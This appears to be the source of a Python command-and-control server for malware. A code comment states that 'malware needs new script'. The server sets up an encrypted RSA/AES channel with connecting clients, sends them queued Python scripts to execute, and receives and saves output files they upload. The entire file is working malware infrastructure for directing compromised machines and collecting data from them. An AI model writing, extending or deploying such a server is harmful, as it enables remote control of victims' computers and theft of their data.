import os
import socket
import rsa
from Crypto.Cipher import AES
import tqdm


def encrypt(data, key):
    cipher = AES.new(key, AES.MODE_EAX)
    return cipher.nonce + cipher.encrypt(data)


def decrypt(data, key):
    cipher = AES.new(key, AES.MODE_EAX, nonce=data[0:16])
    return cipher.decrypt(data[16:])


if __name__ == '__main__':
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 786))
    server_socket.listen()
    while (True):
        print('connection initiated')
        client_socket, client_ip = server_socket.accept()
        (public_key, private_key) = rsa.newkeys(1024)
        client_socket.send((str(public_key.n) + ':' + str(public_key.e)).encode())
        data = client_socket.recv(1024)
        encryption_key = rsa.decrypt(data, private_key)
        request = decrypt(client_socket.recv(1024), encryption_key).decode()
        print(request)
        # malware needs new script
        if (request == '<newscript>'):
            scripts = os.listdir('./queue')
            filename = ''
            while (filename == '' and scripts):
                print(scripts)
                if scripts[0].endswith('.py'):
                    filename = scripts[0]
                else:
                    os.remove('./queue/' + scripts[0])
                    scripts = scripts[1:]
            print(filename)
            if filename != '':
                filesize = os.path.getsize('./queue/' + filename)
                client_socket.send(encrypt(f'{filename}:{filesize}'.encode(), encryption_key))

                progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True,
                                     unit_divisor=1008)
                with open('./queue/' + filename, "rb") as f:
                    while True:
                        # read the bytes from the file
                        bytes_read = f.read(1008)
                        if not bytes_read:
                            # file transmitting is done
                            keep_alive = False
                            break
                        client_socket.send(encrypt(bytes_read, encryption_key))
                        # update the progress bar
                        progress.update(len(bytes_read))
                os.remove('./queue/' + filename)

            else:
                print('no scripts')
                client_socket.send(encrypt('<nofile>'.encode(), encryption_key))
        elif (request == '<newoutput>'):
            data = decrypt(client_socket.recv(1024), encryption_key).decode()
            print(data)
            filename, filesize = data.split(':')
            filesize = int(filesize)

            progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True,
                                 unit_divisor=1008)
            with open('./output/' + filename, "wb") as f:
                while True:
                    # read 1024 bytes from the socket (receive)
                    bytes_read = client_socket.recv(1024)
                    if not bytes_read:
                        # nothing is received
                        # file transmitting is done
                        break
                    # write to the file the bytes we just received
                    bytes_read = decrypt(bytes_read, encryption_key)
                    f.write(bytes_read)
                    # update the progress bar
                    progress.update(len(bytes_read))
        client_socket.close()
